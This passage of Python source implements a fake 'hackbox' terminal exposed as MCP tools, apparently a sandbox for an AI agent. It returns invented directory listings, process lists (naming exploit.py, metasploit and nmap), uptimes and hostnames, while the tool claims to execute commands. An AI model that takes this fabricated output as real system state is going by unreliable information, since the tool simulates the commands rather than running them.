                        perms = "drwxr-xr-x" if file not in ['.', '..'] else "drwxr-xr-x"
                
                month_day = (datetime.now() - timedelta(days=random.randint(0, 30))).strftime("%b %d")
                time_or_year = (datetime.now() - timedelta(days=random.randint(0, 30))).strftime("%H:%M")
                output += f"{perms} 1 user user {size:>8} {month_day} {time_or_year} {file}\n"
            result = output.strip()
        elif "-l" in cmd:
            output = f"total {len(files) * 8}\n"
            for file in files:
                if file.endswith(('.py', '.txt', '.md', '.json', '.yaml', '.csv')):
                    size = random.randint(500, 8000)
                    perms = "-rw-r--r--"
                    month_day = (datetime.now() - timedelta(days=random.randint(0, 30))).strftime("%b %d")
                    time_or_year = (datetime.now() - timedelta(days=random.randint(0, 30))).strftime("%H:%M")
                    output += f"{perms} 1 user user {size:>8} {month_day} {time_or_year} {file}\n"
                else:
                    perms = "drwxr-xr-x"
                    month_day = (datetime.now() - timedelta(days=random.randint(0, 30))).strftime("%b %d")
                    time_or_year = (datetime.now() - timedelta(days=random.randint(0, 30))).strftime("%H:%M")
                    output += f"{perms} 3 user user {random.randint(96, 4096):>8} {month_day} {time_or_year} {file}\n"
            result = output.strip()
        elif "-a" in cmd:
            all_files = ["."] + [".."] + [f".{random.choice(['cache', 'config', 'local', 'tmp'])}"] + files
            result = "  ".join(all_files)
        else:
            result = "  ".join(files)
        
        logging.info(f"ls output: {len(files)} items in {current_dir}")
        write_session_log(cmd, result)
        return result
    
    elif cmd == "pwd":
        return current_dir
    
    elif cmd.startswith("cd "):
        new_dir = cmd[3:].strip()
        old_dir = current_dir
        
        if new_dir == "..":
            parts = current_dir.split("/")
            if len(parts) > 2:
                current_dir = "/".join(parts[:-1])
            else:
                current_dir = "/"
        elif new_dir.startswith("/"):
            if new_dir in filesystem:
                current_dir = new_dir
            else:
                error_msg = f"cd: {new_dir}: No such file or directory"
                logging.warning(f"cd failed: {new_dir} not found")
                write_session_log(cmd, error_msg)
                return error_msg
        else:
            new_path = f"{current_dir}/{new_dir}".replace("//", "/")
            if new_path in filesystem:
                current_dir = new_path
            else:
                error_msg = f"cd: {new_dir}: No such file or directory"
                logging.warning(f"cd failed: {new_path} not found")
                write_session_log(cmd, error_msg)
                return error_msg
        
        logging.info(f"Changed directory: {old_dir} -> {current_dir}")
        write_session_log(cmd, "")
        return ""
    
    elif cmd == "hostname":
        return f"hackbox-{random.randint(1000, 9999)}"
    
    elif cmd == "date":
        return datetime.now().strftime("%a %b %d %H:%M:%S %Z %Y")
    
    elif cmd == "uptime":
        uptime_hours = random.randint(1, 720)
        uptime_days = uptime_hours // 24
        uptime_hours = uptime_hours % 24
        load_avg = [round(random.uniform(0.1, 2.0), 2) for _ in range(3)]
        return f" {datetime.now().strftime('%H:%M:%S')} up {uptime_days} days, {uptime_hours}:{random.randint(0, 59):02d}, 3 users, load average: {load_avg[0]}, {load_avg[1]}, {load_avg[2]}"
    
    elif cmd.startswith("echo "):
        return cmd[5:]
    
    elif cmd == "ps" or cmd == "ps aux":
        processes = [
            ("root", "1", "0.0", "0.1", "19696", "1544", "??", "Ss", "Jul16", "0:01.23", "/sbin/init"),
            ("user", str(random.randint(1000, 9999)), "0.5", "2.3", "123456", "12345", "pts/0", "S", "10:30", "0:05.67", "python3 exploit.py"),
            ("user", str(random.randint(1000, 9999)), "1.2", "4.5", "234567", "23456", "??", "S", "10:25", "0:15.89", "/usr/bin/metasploit"),
            ("user", str(random.randint(1000, 9999)), "0.1", "0.8", "45678", "4567", "pts/0", "R+", "10:35", "0:00.01", "ps aux"),
            ("user", str(random.randint(1000, 9999)), "0.3", "1.2", "67890", "6789", "??", "S", "09:15", "0:45.12", "nmap"),
            ("root", str(random.randint(1000, 9999)), "0.0", "0.5", "11111", "1111", "??", "S", "08:30", "0:12.34", "/usr/sbin/sshd"),
        ]
        
        output = "USER       PID  %CPU %MEM      VSZ    RSS   TTY  STAT STARTED      TIME COMMAND\n"
        for proc in processes:
            output += f"{proc[0]:<8} {proc[1]:>5} {proc[2]:>5} {proc[3]:>5} {proc[4]:>8} {proc[5]:>7} {proc[6]:>5} {proc[7]:>4} {proc[8]:>8} {proc[9]:>9} {proc[10]}\n"
        return output.strip()
    
    elif cmd.startswith("cat "):
        filename = cmd[4:].strip()
        if filename.startswith("~"):
            filename = filename.replace("~", "/home/user")
        
        current_files = filesystem.get(current_dir, [])
        if filename in current_files or filename.split("/")[-1] in current_files:
            return get_file_content(filename.split("/")[-1])
        else:
            return f"cat: {filename}: No such file or directory"
    
    elif cmd == "history":
        return "\n".join([f"{i+1:4d}  {cmd}" for i, cmd in enumerate(command_history[-20:])])
    
    elif cmd.startswith("python") and ("version" in cmd or "--version" in cmd):
        return "Python 3.11.4"
    
    elif cmd == "uname -a":
        return f"Linux hackbox-{random.randint(1000, 9999)} 5.15.0-{random.randint(70, 90)}-generic #{random.randint(70, 90)}~20.04.1-Ubuntu SMP {datetime.now().strftime('%a %b %d %H:%M:%S')} UTC 2024 x86_64 x86_64 x86_64 GNU/Linux"
    
    else:
        result = f"bash: {cmd}: command not found"
        logging.warning(f"Unknown command: {cmd}")
        write_session_log(cmd, result)
        return result

@mcp.tool()
def terminal(command: str) -> str:
    """Execute a terminal command in the hacker environment"""
    result = execute_command(command)
    
    logging.info(f"Terminal interaction - Command: {command}, Output length: {len(result) if result else 0}")
    
    if result:
        return f"user@hackbox:{current_dir}$ {command}\n{result}"
    else:
        return f"user@hackbox:{current_dir}$ {command}"

@mcp.tool()
def current_directory() -> str:
    """Get the current directory"""
    return current_dir

@mcp.tool()
def command_history() -> str:
    """Show recent command history"""
    if not command_history:
        return "No commands in history"
    return "\n".join([f"{i+1:4d}  {cmd}" for i, cmd in enumerate(command_history[-10:])])

if __name__ == "__main__":
    mcp.run()
